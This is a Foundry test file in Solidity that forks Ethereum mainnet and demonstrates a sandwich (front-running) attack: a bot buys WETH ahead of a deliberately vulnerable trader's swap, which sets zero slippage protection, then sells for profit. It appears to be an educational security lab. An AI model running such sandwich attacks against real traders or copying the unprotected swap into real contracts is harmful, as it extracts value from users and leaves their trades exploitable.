// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../../src/v8/VulnerableTrader.sol";
import "../../src/v8/SandwichBot.sol";

contract FrontRunning is Test {
    address constant UNISWAP_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;

    VulnerableTrader public victim;
    SandwichBot public bot;

    function setUp() public {
        // Fork mainnet at a specific block for reproducibility
        console.log("\n=== SETUP (Mainnet Fork) ===");
        vm.createSelectFork(vm.envString("INFURA_URL"), 23_000_000);

        // Deploy victim and bot contracts
        victim = new VulnerableTrader(UNISWAP_ROUTER, WETH);
        deal(DAI, address(victim), 100_000 ether);
        console.log("VulnerableTrader deployed");
        console.log("Fund with:", IERC20(DAI).balanceOf(address(victim)) / 1e18, "DAI");

        bot = new SandwichBot(UNISWAP_ROUTER);
        deal(DAI, address(bot), 200_000 ether);
        console.log("SandwichBot deployed");
        console.log("Fund with:", IERC20(DAI).balanceOf(address(bot)) / 1e18, "DAI");
    }

    function testSandwichAttack() public {
        console.log("\n=== SANDWICH ATTACK DEMO ===\n");

        uint256 victimAmount = 50_000 ether; // Victim wants to swap 50K DAI
        uint256 botAmount = 100_000 ether; // Bot uses 100K DAI to sandwich

        uint256 initialBalance = IERC20(DAI).balanceOf(address(bot));
        console.log("[STEP 0] Initial state");
        console.log("  Bot initial balance:", initialBalance / 1e18, "tokens\n");

        // Bot front-runs
        // In a real scenario, the bot would monitor the mempool and detect the victim's tx
        console.log("[STEP 1] Bot front-runs: Buy WETH to push price up\n");
        uint256 wethBought = bot.frontRun(DAI, WETH, botAmount);

        // Victim's swap
        // In a real scenario, the tx would be waiting in the mempool
        console.log("[STEP 2] Victim's swap executes at inflated price\n");
        victim.swapTokensVulnerable(DAI, WETH, victimAmount, 0); // NO SLIPPAGE PROTECTION!

        // Bot back-runs
        console.log("[STEP 3] Bot back-runs: Sell WETH for profit\n");
        bot.backRun(WETH, DAI, wethBought);

        // Calculate profit
        uint256 finalBalance = IERC20(DAI).balanceOf(address(bot));
        uint256 profit = finalBalance - initialBalance;

        // Assertions
        assertGt(profit, 0, "Sandwich attack should be profitable");

        console.log("[STEP 4] Results\n");
        console.log("  Bot profit:", profit / 1e18, "DAI");
        console.log("  Profit %:", (profit * 10_000) / botAmount, "bps");
    }
}
